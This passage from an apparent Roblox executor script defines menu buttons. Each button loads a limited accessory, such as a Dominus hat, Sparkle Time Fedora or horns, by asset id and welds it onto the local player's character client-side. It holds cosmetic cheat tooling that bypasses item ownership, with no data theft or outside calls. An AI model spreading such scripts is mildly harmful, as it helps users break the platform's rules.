                        local _ = CFrame.new(0, 0.5, 0)
                        local a = e.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 1180433861
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})


CharacterTab:AddButton({
	Name = "Ice Valkyrie [R15 & R6]",
	Callback = function()
            function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(a, _, b, c, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = b
            f.Part1 = c
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function b(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = b(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(e, a)
            a.Parent = e
            local c = a:FindFirstChild("Handle")
            if c then
                local d = c:FindFirstChildOfClass("Attachment")
                if d then
                    local _ = b(e, d.Name)
                    if _ then
                        l(_, d)
                    end
                else
                    local d = e:FindFirstChild("Head")
                    if d then
                        local b = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        _("HeadWeld", d, d, c, b, a)
                    end
                end
            end
        end
        local _ = 4390891467
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

local Section = CharacterTab:AddSection({
	Name = "Fiery Horns"
})


CharacterTab:AddButton({
	Name = "Fiery Horns of the Netherworld [R15 & R6]",
	Callback = function()
            function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(c, a, e, d, b, _)
            local f = Instance.new("Weld")
            f.Name = c
            f.Part0 = e
            f.Part1 = d
            f.C0 = b
            f.C1 = _
            f.Parent = a
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(e, _)
            _.Parent = e
            local d = _:FindFirstChild("Handle")
            if d then
                local a = d:FindFirstChildOfClass("Attachment")
                if a then
                    local _ = c(e, a.Name)
                    if _ then
                        l(_, a)
                    end
                else
                    local c = e:FindFirstChild("Head")
                    if c then
                        local a = CFrame.new(0, 0.5, 0)
                        local _ = _.AttachmentPoint
                        b("HeadWeld", c, c, d, a, _)
                    end
                end
            end
        end
        local _ = 215718515
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})


CharacterTab:AddButton({
	Name = "Frozen Horns of the Frigid Planes [R15 & R6]",
	Callback = function()
            function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(_, a, b, d, c, e)
            local f = Instance.new("Weld")
            f.Name = _
            f.Part0 = b
            f.Part1 = d
            f.C0 = c
            f.C1 = e
            f.Parent = a
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(e, c)
            c.Parent = e
            local d = c:FindFirstChild("Handle")
            if d then
                local b = d:FindFirstChildOfClass("Attachment")
                if b then
                    local _ = a(e, b.Name)
                    if _ then
                        l(_, b)
                    end
                else
                    local e = e:FindFirstChild("Head")
                    if e then
                        local b = CFrame.new(0, 0.5, 0)
                        local a = c.AttachmentPoint
                        _("HeadWeld", e, e, d, b, a)
                    end
                end
            end
        end
        local _ = 74891470
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})


CharacterTab:AddButton({
	Name = "Poisoned Horns of the Toxic Wasteland [R15 & R6]",
	Callback = function()
            function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(c, e, _, b, d, a)
            local f = Instance.new("Weld")
            f.Name = c
            f.Part0 = _
            f.Part1 = b
            f.C0 = d
            f.C1 = a
            f.Parent = e
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(b, c)
            c.Parent = b
            local d = c:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = a(b, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local e = b:FindFirstChild("Head")
                    if e then
                        local a = CFrame.new(0, 0.5, 0)
                        local b = c.AttachmentPoint
                        _("HeadWeld", e, e, d, a, b)
                    end
                end
            end
        end
        local _ = 1744060292
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})


local Section = CharacterTab:AddSection({
	Name = "Dominus's"
})



CharacterTab:AddButton({
	Name = "Dominus Vespertilio [R15 & R6]",
	Callback = function()
            function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(c, b, _, a, d, e)
            local f = Instance.new("Weld")
            f.Name = c
            f.Part0 = _
            f.Part1 = a
            f.C0 = d
            f.C1 = e
            f.Parent = b
            return f
        end
        local function b(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = b(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(d, a)
            a.Parent = d
            local c = a:FindFirstChild("Handle")
            if c then
                local e = c:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = b(d, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local d = d:FindFirstChild("Head")
                    if d then
                        local b = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        _("HeadWeld", d, d, c, b, a)
                    end
                end
            end
        end
        local _ = 96103379
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})


CharacterTab:AddButton({
	Name = "Dominus Rex [R15 & R6]",
	Callback = function()
            function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(d, e, c, b, a, _)
            local f = Instance.new("Weld")
            f.Name = d
            f.Part0 = c
            f.Part1 = b
            f.C0 = a
            f.C1 = _
            f.Parent = e
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(c, _)
            _.Parent = c
            local d = _:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = a(c, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = c:FindFirstChild("Head")
                    if c then
                        local a = CFrame.new(0, 0.5, 0)
                        local _ = _.AttachmentPoint
                        b("HeadWeld", c, c, d, a, _)
                    end
                end
            end
        end
        local _ = 250395631
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})


CharacterTab:AddButton({
	Name = "Dominus Praefectus [R15 & R6]",
	Callback = function()
	            function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function a(a, _, e, c, d, b)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = e
            f.Part1 = c
            f.C0 = d
            f.C1 = b
            f.Parent = _
            return f
        end
        local function b(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = b(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(e, _)
            _.Parent = e
            local d = _:FindFirstChild("Handle")
            if d then
                local c = d:FindFirstChildOfClass("Attachment")
                if c then
                    local _ = b(e, c.Name)
                    if _ then
                        l(_, c)
                    end
                else
                    local c = e:FindFirstChild("Head")
                    if c then
                        local b = CFrame.new(0, 0.5, 0)
                        local _ = _.AttachmentPoint
                        a("HeadWeld", c, c, d, b, _)
                    end
                end
            end
        end
        local _ = 527365852
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Dominus Messor [R15 & R6]",
	Callback = function()
	    	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(e, c, d, b, _, a)
            local f = Instance.new("Weld")
            f.Name = e
            f.Part0 = d
            f.Part1 = b
            f.C0 = _
            f.C1 = a
            f.Parent = c
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, e)
            e.Parent = _
            local c = e:FindFirstChild("Handle")
            if c then
                local d = c:FindFirstChildOfClass("Attachment")
                if d then
                    local _ = a(_, d.Name)
                    if _ then
                        l(_, d)
                    end
                else
                    local d = _:FindFirstChild("Head")
                    if d then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = e.AttachmentPoint
                        b("HeadWeld", d, d, c, _, a)
                    end
                end
            end
        end
        local _ = 64444871
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Dominus Infernus [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(c, d, b, _, a, e)
            local f = Instance.new("Weld")
            f.Name = c
            f.Part0 = b
            f.Part1 = _
            f.C0 = a
            f.C1 = e
            f.Parent = d
            return f
        end
        local function b(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = b(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(a, d)
            d.Parent = a
            local e = d:FindFirstChild("Handle")
            if e then
                local c = e:FindFirstChildOfClass("Attachment")
                if c then
                    local _ = b(a, c.Name)
                    if _ then
                        l(_, c)
                    end
                else
                    local c = a:FindFirstChild("Head")
                    if c then
                        local b = CFrame.new(0, 0.5, 0)
                        local a = d.AttachmentPoint
                        _("HeadWeld", c, c, e, b, a)
                    end
                end
            end
        end
        local _ = 31101391
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Dominus Frigidus [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(c, _, a, b, d, e)
            local f = Instance.new("Weld")
            f.Name = c
            f.Part0 = a
            f.Part1 = b
            f.C0 = d
            f.C1 = e
            f.Parent = _
            return f
        end
        local function b(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = b(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(a, d)
            d.Parent = a
            local e = d:FindFirstChild("Handle")
            if e then
                local c = e:FindFirstChildOfClass("Attachment")
                if c then
                    local _ = b(a, c.Name)
                    if _ then
                        l(_, c)
                    end
                else
                    local c = a:FindFirstChild("Head")
                    if c then
                        local b = CFrame.new(0, 0.5, 0)
                        local a = d.AttachmentPoint
                        _("HeadWeld", c, c, e, b, a)
                    end
                end
            end
        end
        local _ = 48545806
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Dominus Formidulosus [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(e, c, d, b, a, _)
            local f = Instance.new("Weld")
            f.Name = e
            f.Part0 = d
            f.Part1 = b
            f.C0 = a
            f.C1 = _
            f.Parent = c
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(e, _)
            _.Parent = e
            local c = _:FindFirstChild("Handle")
            if c then
                local d = c:FindFirstChildOfClass("Attachment")
                if d then
                    local _ = a(e, d.Name)
                    if _ then
                        l(_, d)
                    end
                else
                    local d = e:FindFirstChild("Head")
                    if d then
                        local a = CFrame.new(0, 0.5, 0)
                        local _ = _.AttachmentPoint
                        b("HeadWeld", d, d, c, a, _)
                    end
                end
            end
        end
        local _ = 4255053867
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Dominus Empyreus [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(_, a, b, d, c, e)
            local f = Instance.new("Weld")
            f.Name = _
            f.Part0 = b
            f.Part1 = d
            f.C0 = c
            f.C1 = e
            f.Parent = a
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, d)
            d.Parent = _
            local e = d:FindFirstChild("Handle")
            if e then
                local a = e:FindFirstChildOfClass("Attachment")
                if a then
                    local _ = c(_, a.Name)
                    if _ then
                        l(_, a)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local a = CFrame.new(0, 0.5, 0)
                        local _ = d.AttachmentPoint
                        b("HeadWeld", c, c, e, a, _)
                    end
                end
            end
        end
        local _ = 21070012
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})


CharacterTab:AddButton({
	Name = "Dominus Aureus [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(e, d, b, c, a, _)
            local f = Instance.new("Weld")
            f.Name = e
            f.Part0 = b
            f.Part1 = c
            f.C0 = a
            f.C1 = _
            f.Parent = d
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, e)
            e.Parent = _
            local d = e:FindFirstChild("Handle")
            if d then
                local c = d:FindFirstChildOfClass("Attachment")
                if c then
                    local _ = a(_, c.Name)
                    if _ then
                        l(_, c)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = e.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 138932314
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Dominus Astra [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 162067148
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

local Section = CharacterTab:AddSection({
	Name = "Sparkle Time Fedora's"
})


CharacterTab:AddButton({
	Name = "Sky-Blue-Sparkle-Time-Fedora [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(_, a, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = _
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = a
            return f
        end
        local function b(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = b(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(a, c)
            c.Parent = a
            local d = c:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = b(a, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local e = a:FindFirstChild("Head")
                    if e then
                        local a = CFrame.new(0, 0.5, 0)
                        local b = c.AttachmentPoint
                        _("HeadWeld", e, e, d, a, b)
                    end
                end
            end
        end
        local _ = 493476042
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Sparkle-Time-Fedora [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function a(_, b, a, d, e, c)
            local f = Instance.new("Weld")
            f.Name = _
            f.Part0 = a
            f.Part1 = d
            f.C0 = e
            f.C1 = c
            f.Parent = b
            return f
        end
        local function b(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = b(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(e, _)
            _.Parent = e
            local d = _:FindFirstChild("Handle")
            if d then
                local c = d:FindFirstChildOfClass("Attachment")
                if c then
                    local _ = b(e, c.Name)
                    if _ then
                        l(_, c)
                    end
                else
                    local c = e:FindFirstChild("Head")
                    if c then
                        local b = CFrame.new(0, 0.5, 0)
                        local _ = _.AttachmentPoint
                        a("HeadWeld", c, c, d, b, _)
                    end
                end
            end
        end
        local _ = 1285307
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Teal-Sparkle-Time-Fedora [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(e, c, d, b, _, a)
            local f = Instance.new("Weld")
            f.Name = e
            f.Part0 = d
            f.Part1 = b
            f.C0 = _
            f.C1 = a
            f.Parent = c
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, e)
            e.Parent = _
            local d = e:FindFirstChild("Handle")
            if d then
                local a = d:FindFirstChildOfClass("Attachment")
                if a then
                    local _ = c(_, a.Name)
                    if _ then
                        l(_, a)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = e.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 147180077
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Green-Sparkle-Time-Fedora [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(c, b, _, a, d, e)
            local f = Instance.new("Weld")
            f.Name = c
            f.Part0 = _
            f.Part1 = a
            f.C0 = d
            f.C1 = e
            f.Parent = b
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(c, d)
            d.Parent = c
            local e = d:FindFirstChild("Handle")
            if e then
                local b = e:FindFirstChildOfClass("Attachment")
                if b then
                    local _ = a(c, b.Name)
                    if _ then
                        l(_, b)
                    end
                else
                    local c = c:FindFirstChild("Head")
                    if c then
                        local a = CFrame.new(0, 0.5, 0)
                        local b = d.AttachmentPoint
                        _("HeadWeld", c, c, e, a, b)
                    end
                end
            end
        end
        local _ = 100929604
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Midnight-Blue-Sparkle-Time-Fedora [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(_, a, b, c, e, d)
            local f = Instance.new("Weld")
            f.Name = _
            f.Part0 = b
            f.Part1 = c
            f.C0 = e
            f.C1 = d
            f.Parent = a
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(e, b)
            b.Parent = e
            local c = b:FindFirstChild("Handle")
            if c then
                local d = c:FindFirstChildOfClass("Attachment")
                if d then
                    local _ = a(e, d.Name)
                    if _ then
                        l(_, d)
                    end
                else
                    local d = e:FindFirstChild("Head")
                    if d then
                        local a = CFrame.new(0, 0.5, 0)
                        local b = b.AttachmentPoint
                        _("HeadWeld", d, d, c, a, b)
                    end
                end
            end
        end
        local _ = 119916949
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Red-Sparkle-Time-Fedora [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(d, e, c, b, a, _)
            local f = Instance.new("Weld")
            f.Name = d
            f.Part0 = c
            f.Part1 = b
            f.C0 = a
            f.C1 = _
            f.Parent = e
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, d)
            d.Parent = _
            local e = d:FindFirstChild("Handle")
            if e then
                local a = e:FindFirstChildOfClass("Attachment")
                if a then
                    local _ = c(_, a.Name)
                    if _ then
                        l(_, a)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local a = CFrame.new(0, 0.5, 0)
                        local _ = d.AttachmentPoint
                        b("HeadWeld", c, c, e, a, _)
                    end
                end
            end
        end
        local _ = 72082328
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Purple-Sparkle-Time-Fedora [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(_, b, a, e, c, d)
            local f = Instance.new("Weld")
            f.Name = _
            f.Part0 = a
            f.Part1 = e
            f.C0 = c
            f.C1 = d
            f.Parent = b
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(c, e)
            e.Parent = c
            local d = e:FindFirstChild("Handle")
            if d then
                local b = d:FindFirstChildOfClass("Attachment")
                if b then
                    local _ = a(c, b.Name)
                    if _ then
                        l(_, b)
                    end
                else
                    local c = c:FindFirstChild("Head")
                    if c then
                        local a = CFrame.new(0, 0.5, 0)
                        local b = e.AttachmentPoint
                        _("HeadWeld", c, c, d, a, b)
                    end
                end
            end
        end
        local _ = 63043890
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Black-Sparkle-Time-Fedora [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(_, e, c, d, b, a)
            local f = Instance.new("Weld")
            f.Name = _
            f.Part0 = c
            f.Part1 = d
            f.C0 = b
            f.C1 = a
            f.Parent = e
            return f
        end
        local function b(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = b(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(a, c)
            c.Parent = a
            local e = c:FindFirstChild("Handle")
            if e then
                local d = e:FindFirstChildOfClass("Attachment")
                if d then
                    local _ = b(a, d.Name)
                    if _ then
                        l(_, d)
                    end
                else
                    local d = a:FindFirstChild("Head")
                    if d then
                        local a = CFrame.new(0, 0.5, 0)
                        local b = c.AttachmentPoint
                        _("HeadWeld", d, d, e, a, b)
                    end
                end
            end
        end
        local _ = 259423244
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "White-Sparkle-Time-Fedora [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(d, e, c, a, b, _)
            local f = Instance.new("Weld")
            f.Name = d
            f.Part0 = c
            f.Part1 = a
            f.C0 = b
            f.C1 = _
            f.Parent = e
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
